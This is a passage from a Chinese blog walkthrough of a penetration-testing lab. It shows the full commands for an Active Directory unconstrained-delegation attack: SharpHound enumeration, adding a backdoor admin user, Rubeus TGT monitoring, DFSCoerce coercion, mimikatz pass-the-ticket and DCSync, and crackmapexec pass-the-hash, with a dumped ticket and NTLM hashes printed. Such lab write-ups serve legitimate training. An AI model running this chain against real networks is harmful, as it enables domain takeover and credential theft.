<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat /users/administrator/flag/flag02.txt</span><br><span class="line"> ________  _______   ___       _______   ________  ________  _________  ___  ________  ________      </span><br><span class="line">|\   ___ \|\  ___ \ |\  \     |\  ___ \ |\   ____\|\   __  \|\___   ___\\  \|\   __  \|\   ___  \    </span><br><span class="line">\ \  \_|\ \ \   __/|\ \  \    \ \   __/|\ \  \___|\ \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \   </span><br><span class="line"> \ \  \ \\ \ \  \_|/_\ \  \    \ \  \_|/_\ \  \  __\ \   __  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \  </span><br><span class="line">  \ \  \_\\ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \|\  \ \  \ \  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \ </span><br><span class="line">   \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \__\ \_______\ \__\\ \__\</span><br><span class="line">    \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|__|\|_______|\|__| \|__|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag02: flag&#123;727be2e3-d457-464d-a87a-d7f1dbc69951&#125;</span><br></pre></td></tr></table></figure>
<h2 id="域控和机器19"><a href="#域控和机器19" class="headerlink" title="域控和机器19"></a>域控和机器19</h2><p>传个SharpHound.exe上去进行信息收集<br><code>SharpHound.exe -c all</code><br>然后成功获取zip文件，download下来<br><code>download C:\\Users\\Adrian\\Desktop\\20250819230942_BloodHound.zip /home/kali/Desktop/20250819230942_BloodHound.zip</code><br>然后在kali中启动bloodhound</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j start </span><br><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure>
<p><code>Shortest Paths to Unconstrained Delegation Systems</code><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755619568409.png"><br>发现win19有非约束性委托<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_75218183/article/details/131084165">非约束性委派攻击</a><br>先添加个有管理员权限的新用户方便远程操作<br><code>net user xianxin pass@123 /add</code><br>这里密码太简单可能会注册失败<br><code>net localgroup administrators xianxin /add</code><br>添加管理员权限组方便后续以管理员权限运行<br>远程过去（windows远程桌面也可以）<br><code>proxychains rdesktop 172.22.4.45 -u xianxin -p &#39;pass@123&#39; -r disk:mydisk=&quot;./http&quot;</code><br>传上去Rubeus.exe和mimikatz.exe<br>监听 TGT</p>
<blockquote>
<p>我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT<br>&#x2F;interval:1 设置监听间隔1秒<br>&#x2F;filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT<br>DC01$为域控的主机名字加$</p>
</blockquote>
<p><code>Rubeus.exe monitor /interval:1 /filteruser:DC01$</code></p>
<blockquote>
<p>一定要管理员权限运行，不然会直接运行结束，起不到监听的作用</p>
</blockquote>
<blockquote>
<p>怎么让域控访问我们呢？有几个方法。<br>1.printspooler（打印机漏洞）<br>2.DFSCoerce<br>3.PetitPotam</p>
</blockquote>
<p>利用DFSCoerce诱导管理员访问<br><code>proxychains python dfscoerce.py -u &quot;WIN19$&quot; -hashes :29acd15241dd0b1f614d6912e59ab7b4 -d xiaorang.lab win19 172.22.4.7</code><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755618812604.png"><br>成功拿到TGT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4Nb8k2UMxlNPYwy3CX7GoRJ7+OEpyqvc1ughgJdtcQR6FASRrGWaVBZHnkjoTO6YgZtySECixVGYfeOvaz5MOiiyTRAsgH6s0EHQzZHYo9g4O/zJ5JCWqQbKMS6G4z+JfL4N24nJBe8ib1vzi90kPuZm0CBtC2mfiEOyvDHQwAZBN52FDre/LidRgaJc6FfeDV1tioSlYsrp5Dsf+rgnaifdw9KtElRNrlDjGPj5+Hh8iE/uoIzh5NN/VZTf8Z7UlpapLdTlz06wh2cblivmkJmVwf1xouf5dEcVmwm3exnm101moSaFzt0xOz0mKZwh9DFnKNkeUcwnpWe5J6q2mx2uzcNLNw+lFMWXUTVvcviMjqGvghBaUE1UXkzEeEiIg+R8doGqHR/wI7Lc+oPE58fC6W4CcCti6IMq5VknWaPeLvdGmmwhYpGfXkEkJHhi/7fYe2uPc6wQz+kZzehv4iHJbyuU8syuNvkPchJCjeDowKhYAAATYAyb+QSrxyLQmqFPTRzQ4WqobGL4U6AdeN3W0fSBigOdVcL8GvM5NxV9m2K/X1/EcC5JnjoAIjCgrZY8ZBxn42Cq8me+Ri9nn2FLlE93n8Jix1q1Z4KQfCxRkWhN3ShKuIzN4lX7J1f+av4hUaScNe/FyiOPr9h5j1se1BoBd51f431x22/b6ZcvovCwPPZSJUuHR3vK5UewtvSp0hbMr1nSnLFIo9BrUG0v9Dqb2hXXXY3vqjr9LOwSkJMLwXc/AWa2AfqZkUtoD3NltMyeR4wUp6ZP9S50xzCgZ+kbLURutAbWPyiZGyOHeZ3Uaa6skfMtZh1jEOlwhtCVZ2a+rGGl2iR8vH5AMyTmO/PHeeyeEekOsrupSVqdwkF4w5jTTJFnrQ8qBGKGh4kDInfL1mw4Ny3aEdMFtiPAa/8e3+sDagLyFJ4aVeaU7cLHa4YuIb6DuAjXNlYvc1n8X6/NqkNMNuxo6G3Nc1A/gqje7iY/gB76/MJEEqC5wac2eV/1LEUx59ZtsNV4/j5FFWJepGNsYCN26s2qiO8q4/O15F0pS/9Wj/eHJIH1qrGRxcYMKplFMB9Q7taLKqoiBbutDf+8VqbUghWfx9g8xn80gTn5t7QgWBemCSjudEbA8VvNHN7H5iIHndIjfWmLPKDbVZHQ8O5VpW821L83BmUBEmjAkYo0OwRoZtIvhTwpaPVTVA4GFYBB6+oK4u6BJ1xmbxCshWQaRLq8ozjkd1+5cCwAeFMPuqAfieNS8FXIFhLJ+pxJKsWzdX4Z5aoSHh8esu7w0pEzW5mHNOotvDFWm+6c5s+PO5bckYtvA7RhEdpfja0Jons21393YmAORDGqa7iL088qZFuxmFWCpm3H/FmNaM2fWqENeNrK4dF65MdVi2eoA5mKLiyBf7Vl2lL9v4JtkIwMUNobHS7dlhSluXqKiJhJg5dOijgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkD7+xagr5j3T9oEnIgOGeCopcWlXFdtWTIw3mRNplr6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDgxOTEyMDA1M1qmERgPMjAyNTA4MTkyMjAwNTNapxEYDzIwMjUwODI2MTIwMDUzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure>
<p>把这个base保存在base.txt里面<br>解base64之后直接保存为1.kirbi<br><code>certutil -f -decode base.txt DC.kirbi</code><br>请求dcsync<br><code>mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC.kirbi&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514</span><br><span class="line">1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512</span><br><span class="line">1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512</span><br><span class="line">1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096</span><br><span class="line">1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096</span><br><span class="line">1000    DC01$   8d6f36c1dc0a0d7719ed75f013cd672d        532480</span><br><span class="line">500     Administrator   4889f6553239ace1f7c47fa2c619c252        512</span><br><span class="line">1103    FILESERVER$     c6531d84369dcafc429d34b0470551e1        4096</span><br><span class="line">1104    WIN19$  29acd15241dd0b1f614d6912e59ab7b4        528384</span><br></pre></td></tr></table></figure>
<blockquote>
<p>RID: 500 - 这是内置管理员帐户的固定 RID。<br>用户名: Administrator - 内置的域管理员帐户。<br>拥有此哈希相当于拥有域的最高权限。</p>
</blockquote>
<p>拿到管理员的hash<br>然后横向拿flag就好了<br><code>proxychains crackmapexec smb 172.22.4.19 -u Administrator -H4889f6553239ace1f7c47fa2c619c252 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</code><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755619198727.png"><br><code>proxychains crackmapexec smb 172.22.4.7 -u administrator -H4889f6553239ace1f7c47fa2c619c252 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag04.txt&quot;</code><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755619216054.png"></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50643984/article/details/129264275">域渗透-备忘录</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io">xianxin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io/2025/08/24/Delegation/">https://xianxinyyds.github.io/2025/08/24/Delegation/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xianxinyyds.github.io" target="_blank">仙心</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/xianxin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/08/28/22%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3/" title="22网鼎半决"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">22网鼎半决</div></div><div class="info-2"><div class="info-item-1">22网鼎半决该靶场为2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4个flag，分布于不同的靶机。 tag域渗透、AD CS、内网渗透、Wordpress、Kerberos 信息收集先用fscan扫一下机器./fscan.exe -h 39.98.116.144 -nobr 123456start infoscan39.98.116.144:22 open39.98.116.144:80 open[*] alive ports len is: 2start vulscan[*] WebTitle http://39.98.116.144      code:200 len:39988  title:XIAORANG.LAB 机器26只有一个web服务，访问看看，发现是WordPress先扫一下看看有没有漏洞wpscan –url http://39.98.116.144没什么收获扫一下网站http://39...</div></div></div></a><a class="pagination-related" href="/2025/08/23/Lilctf/" title="Lilctf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Lilctf</div></div><div class="info-2"><div class="info-item-1">Lilctf 2025webez_bottle给出了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from bottle import route, run, template, post, request, static_file, errorimport osimport zipfileimport hashlibimport time# hint: flag in /flag , have a tryUPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#x27;uploads&#x27;...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/18/%E6%B8%97%E9%80%8F/" title="htb渗透知识点整理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-18</div><div class="info-item-2">htb渗透知识点整理</div></div><div class="info-2"><div class="info-item-1">渗透常用命令linux cd: 切换目录 cd &#x2F;home&#x2F;user&#x2F;a&#x2F;b&#x2F;cls: 列出目录内容 ls -lcp: 复制文件 cp 1.txt &#x2F;home&#x2F;user&#x2F;amv: 移动文件 mv .txt &#x2F;home&#x2F;user&#x2F;arm: 删除文件 rm -rf acat: 查看文件内容 cat &#x2F;home&#x2F;user&#x2F;1.txtmore: 分页查看文件内容 more &#x2F;home&#x2F;user&#x2F;1.txtless: 分页查看文件内容 less &#x2F;home&#x2F;user&#x2F;1.txtping: 测试网络连接 ping baidu.comifconfig: 查看网络配置信息 ifconfigps: 查看当前运行的进程 ps auxkill: 结束指定的进程 kill -9 1234clear: 清除屏幕 clearshutdown: 关闭计算机 shutdown -h nowtee: 读取标准输入的数...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xianxin</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xianxinyyds" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1090084672@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegation"><span class="toc-number">1.</span> <span class="toc-text">Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tag"><span class="toc-number">1.1.</span> <span class="toc-text">tag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A836"><span class="toc-number">1.3.</span> <span class="toc-text">机器36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A845"><span class="toc-number">1.4.</span> <span class="toc-text">机器45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E5%92%8C%E6%9C%BA%E5%99%A819"><span class="toc-number">1.5.</span> <span class="toc-text">域控和机器19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.6.</span> <span class="toc-text">补充</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/28/22%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3/" title="22网鼎半决">22网鼎半决</a><time datetime="2025-08-28T15:20:58.000Z" title="发表于 2025-08-28 23:20:58">2025-08-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/24/Delegation/" title="Delegation">Delegation</a><time datetime="2025-08-24T15:20:58.000Z" title="发表于 2025-08-24 23:20:58">2025-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/23/Lilctf/" title="Lilctf">Lilctf</a><time datetime="2025-08-23T15:20:58.000Z" title="发表于 2025-08-23 23:20:58">2025-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/20/exchange/" title="exchange">exchange</a><time datetime="2025-08-20T15:20:58.000Z" title="发表于 2025-08-20 23:20:58">2025-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/16/Hospital/" title="Hospital">Hospital</a><time datetime="2025-08-16T15:20:58.000Z" title="发表于 2025-08-16 23:20:58">2025-08-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/789.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By xianxin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>